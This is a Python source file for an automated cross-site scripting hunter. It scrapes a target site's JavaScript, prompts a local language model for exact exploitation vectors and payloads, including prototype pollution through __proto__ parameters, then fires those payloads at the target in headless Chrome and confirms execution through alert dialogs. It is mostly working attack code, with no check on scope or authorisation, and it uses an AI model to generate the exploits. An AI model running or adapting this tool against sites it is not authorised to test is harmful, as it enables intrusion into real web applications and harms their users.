#task_xss.py
import requests
import urllib.parse
import time
import re
import json
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from ai_core import ask_ollama_advanced
class IntelligentXSSHunter:
    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.target_analysis = {}
        self.js_intelligence = {}
        self.prototype_vulnerabilities = []
        self.dom_sinks = []
        self.url_sources = []
    def analyze_target_deeply(self, base_url):
        """Perform deep analysis of target JavaScript and DOM structure"""
        print(f"Deep target analysis: {base_url}")
        try:
            response = self.session.get(base_url, timeout=10)
            page_content = response.text
            soup = BeautifulSoup(page_content, 'html.parser')
            all_js_code = ""
            external_scripts = []
            for script in soup.find_all('script'):
                if script.string:
                    all_js_code += script.string + "\n"
                elif script.get('src'):
                    src_url = urllib.parse.urljoin(base_url, script.get('src'))
                    external_scripts.append(src_url)
                    try:
                        js_response = self.session.get(src_url, timeout=5)
                        all_js_code += js_response.text + "\n"
                    except:
                        continue
            if all_js_code.strip():
                self.js_intelligence = self.analyze_javascript_with_ai(all_js_code, base_url)
            url_params = self.extract_url_parameters(base_url, page_content + all_js_code)
            self.target_analysis = {
                'page_content': page_content,
                'javascript_code': all_js_code,
                'external_scripts': external_scripts,
                'forms': len(soup.find_all('form')),
                'inputs': len(soup.find_all(['input', 'textarea'])),
                'url_params': url_params
            }
            return True
        except Exception as e:
            print(f"Error in target analysis: {e}")
            return False

    def extract_url_parameters(self, base_url, content):
        """Extract parameters that the JavaScript processes from URLs"""
        url_param_patterns = [
            r'URLSearchParams\([^)]*\)',
            r'location\.search',
            r'location\.hash', 
            r'window\.location\.search',
            r'getParameter\([\'"]([^\'"]+)[\'"]',
            r'searchParams\.get\([\'"]([^\'"]+)[\'"]',
            r'urlParams\.entries\(\)',
            r'for.*\[key.*value\].*urlParams',
            r'__proto__\[([^\]]+)\]',
            r'levels\.split\([\'"]([^\'"]+)[\'"]'
        ]
        found_params = set()
        for pattern in url_param_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, str) and len(match) > 0 and len(match) < 50:
                    found_params.add(match)
                elif isinstance(match, tuple) and len(match) > 0:
                    found_params.add(match[0])
        return list(found_params)
    def analyze_javascript_with_ai(self, js_code, base_url):
        """Deep code flow analysis for precise vulnerability detection"""
        flow_analysis_prompt = """Analyze this JavaScript code with focus on EXACT data flow from user input to execution.

CRITICAL: Trace the complete execution path:
1. How are URL parameters parsed and processed?
2. What object assignment/merge operations occur?  
3. Where do processed values get used (innerHTML, eval, document.write)?
4. What EXACT parameter names would trigger vulnerabilities?

Look for these specific patterns:
- URLSearchParams or location.search processing
- Prototype pollution via __proto__ or constructor.prototype
- Object merge/assign operations without protection
- Template/innerHTML/outerHTML assignment from user data
- Dynamic property access like obj[userInput]

For each vulnerability found, provide EXACT exploitation details:

Respond with JSON:
{
  "code_flow_analysis": {
    "parameter_processing": "exact method used to parse URL params",
    "vulnerable_assignment": "line of code that creates vulnerability", 
    "execution_sink": "where user data gets executed",
    "data_flow": "step by step: input -> processing -> execution"
  },
  "exploitation_vectors": [
    {
      "vulnerability_type": "prototype_pollution|dom_xss|reflection",
      "exact_parameter": "__proto__[template]",
      "payload_position": "value|hash|header",
      "sink_function": "innerHTML|eval|document.write",
      "working_example": "?__proto__[template]=<img src=x onerror=alert(1)>",
      "confidence": 0.9,
      "explanation": "why this exact parameter works"
    }
  ]
}"""
        
        return ask_ollama_advanced(flow_analysis_prompt, js_code, analysis_type="vulnerability")

    def generate_precise_payloads(self, target_url, flow_analysis):
        """Generate payloads based on exact code flow understanding"""
        if not flow_analysis or not flow_analysis.get('exploitation_vectors'):
            return []
        
        payloads = []
        for vector in flow_analysis['exploitation_vectors']:
            param_name = vector.get('exact_parameter', '')
            sink_function = vector.get('sink_function', '')
            vuln_type = vector.get('vulnerability_type', '')
            
            payload_crafting_prompt = f"""Based on this EXACT vulnerability:
Parameter: {param_name}
Sink: {sink_function} 
Type: {vuln_type}

Generate 3 precise XSS payloads that will execute through this specific sink.
Consider:
- {sink_function} context requirements
- HTML entity encoding if needed
- Event handlers vs script tags
- Browser compatibility

Respond with JSON:
{{
  "payloads": [
    {{
      "parameter": "{param_name}",
      "value": "<img src=x onerror=alert(1)>",
      "explanation": "why this works with {sink_function}"
    }}
  ]
}}"""
            
            ai_response = ask_ollama_advanced(payload_crafting_prompt, json.dumps(vector, indent=2), analysis_type="payload")
            if ai_response and ai_response.get('payloads'):
                for payload_data in ai_response['payloads']:
                    payloads.append({
                        'parameter': payload_data.get('parameter', param_name),
                        'payload': payload_data.get('value', ''),
                        'type': vuln_type,
                        'confidence': vector.get('confidence', 0.5),
                        'explanation': payload_data.get('explanation', ''),
                        'sink': sink_function
                    })
        
        return payloads

    def test_precise_payloads(self, base_url, payloads):
        """Test precise payloads with correct parameter formatting"""
        driver = None
        try:
            options = Options()
            options.add_argument("--headless")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            driver = webdriver.Chrome(options=options)
            
            for payload_info in payloads:
                parameter = payload_info.get('parameter', '')
                payload_value = payload_info.get('payload', '')
                vuln_type = payload_info.get('type', '')
                confidence = payload_info.get('confidence', 0)
                
                print(f"Testing {vuln_type} via parameter '{parameter}' (confidence: {confidence:.2f})")
                print(f"Payload value: {payload_value}")
                
                test_url = f"{base_url}?{parameter}={urllib.parse.quote(payload_value)}"
                print(f"Exact test URL: {test_url}")
                
                try:
                    driver.get(test_url)
                    time.sleep(3)
                    
                    success = self.validate_xss_execution(driver, test_url, payload_value)
                    if success:
                        print(f"SUCCESS: XSS confirmed via {parameter}")
                        return {
                            "vulnerability": "Cross-Site Scripting (XSS)",
                            "type": vuln_type,
                            "parameter": parameter,
                            "payload": payload_value,
                            "url": test_url,
                            "confidence": "high",
                            "validation": "selenium_confirmed",
                            "sink": payload_info.get('sink', 'unknown'),
                            "explanation": payload_info.get('explanation', '')
                        }
                    else:
                        print(f"No execution detected for {parameter}")
                        
                except Exception as e:
                    print(f"Error testing {parameter}: {e}")
                    continue
                    
        finally:
            if driver:
                driver.quit()
        return None

    def validate_xss_execution(self, driver, test_url, payload):
        """Enhanced validation with multiple detection methods"""
        try:
            WebDriverWait(driver, 4).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            alert_text = alert.text
            alert.accept()
            print(f"ALERT TRIGGERED: '{alert_text}' from {test_url}")
            return True
        except TimeoutException:
            try:
                page_source = driver.page_source
                console_logs = driver.get_log('browser')
                
                execution_indicators = [
                    'onerror' in payload and 'img' in page_source,
                    'onload' in payload and 'svg' in page_source,
                    any('Uncaught' in log.get('message', '') for log in console_logs),
                    '</script>' in page_source and '<script>' in payload
                ]
                
                if any(execution_indicators):
                    print(f"INDIRECT EXECUTION DETECTED: Payload may have executed without alert")
                    return True
                    
                print("NO EXECUTION DETECTED: Payload did not execute")
                return False
            except:
                print("VALIDATION ERROR: Could not determine execution status")
                return False
        except Exception as e:
            print(f"VALIDATION EXCEPTION: {e}")
            return False

    def learn_from_target(self, base_url):
        """Learn target with precise code flow analysis"""
        print(f"Deep code flow analysis: {base_url}")
        
        success = self.analyze_target_deeply(base_url)
        if not success:
            print("Target analysis failed")
            return None
            
        if not self.js_intelligence:
            print("No JavaScript found to analyze")
            return None
            
        print("Code flow analysis complete:")
        exploitation_vectors = self.js_intelligence.get('exploitation_vectors', [])
        
        if exploitation_vectors:
            for vector in exploitation_vectors:
                print(f"  Vector: {vector.get('exact_parameter', 'unknown')}")
                print(f"  Sink: {vector.get('sink_function', 'unknown')}")
                print(f"  Confidence: {vector.get('confidence', 0):.2f}")
        else:
            print("  No exploitation vectors identified")
            return None
            
        payloads = self.generate_precise_payloads(base_url, self.js_intelligence)
        
        if payloads:
            print(f"Generated {len(payloads)} precise payloads")
            return self.test_precise_payloads(base_url, payloads)
        else:
            print("No precise payloads generated")
            return None
def execute_xss_test(session, target_data, ui=None, use_intelligent=True):
    """Main XSS testing function with AI-driven approach"""
    if not use_intelligent:
        return simple_xss_fallback(session, target_data)
    hunter = IntelligentXSSHunter(session)
    base_url = target_data.get("url", "")
    if not base_url:
        return None
    print(f"Intelligent XSS hunting on {base_url}")
    return hunter.learn_from_target(base_url)
def simple_xss_fallback(session, target_data):
    """Fallback to simple testing if AI approach fails"""
    target_url = target_data.get("url", "")
    params = target_data.get("params", [])
    if not params:
        return None
    basic_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
    driver = None
    try:
        options = Options()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        driver = webdriver.Chrome(options=options)
        for payload in basic_payloads:
            for param in params:
                test_params = {p: 'test' for p in params}
                test_params[param] = payload
                test_url = f"{target_url}?{urllib.parse.urlencode(test_params)}"
                try:
                    driver.get(test_url)
                    WebDriverWait(driver, 2).until(EC.alert_is_present())
                    driver.switch_to.alert.accept()
                    return {
                        "vulnerability": "Cross-Site Scripting (XSS)",
                        "type": "Reflected",
                        "url": target_url,
                        "parameter": param,
                        "payload": payload,
                        "confidence": "medium"
                    }
                except TimeoutException:
                    continue
    finally:
        if driver:
            driver.quit()
    return None

